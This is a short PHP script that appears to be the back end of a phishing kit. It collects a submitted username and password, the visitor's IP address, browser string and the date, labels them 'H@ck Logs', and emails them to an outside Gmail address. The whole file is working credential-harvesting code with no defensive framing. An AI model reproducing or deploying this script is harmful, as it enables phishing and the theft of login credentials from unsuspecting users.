<?php 
$ip = getenv("REMOTE_ADDR"); 
$datamasii=date("D M d, Y g:i a"); 
$e = $_REQUEST['x1'] ;
$p = $_REQUEST['x2'] ;
$returnBox ='20@gmail.com'; // return box



$mesaj = "------------H@ck Da System--------------

-----------H@ck Logs-------------
Username : $e
Password : $p
IP:$ip
----------------------------------------------------
Browser         :  ".$_SERVER['HTTP_USER_AGENT']."
DATE : $datamasii"; 
$subject = "H@ck  LOGS";
mail($returnBox, $subject, $mesaj);

?>




